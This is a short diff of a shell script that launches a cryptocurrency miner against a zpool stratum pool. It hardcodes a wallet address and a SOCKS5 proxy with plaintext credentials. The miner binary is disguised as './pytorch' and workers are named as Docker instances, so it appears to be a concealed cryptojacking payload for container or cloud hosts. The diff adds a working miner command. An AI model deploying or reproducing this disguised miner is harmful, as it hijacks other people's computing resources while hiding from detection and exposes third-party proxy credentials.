@@ -7,4 +7,4 @@ POOL=stratum+tcp://cpupower.na.mine.zpool.ca:6240
 WALLET=MRYuRYQofJEpkcFrSpcrUqmxQfcpFz4wf3
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Dockers)
 PROXY=socks5://cuan:berhasil123@199.249.170.113:443
-./pytorch -a verus -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
+./pytorch -a lyra2z330 -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
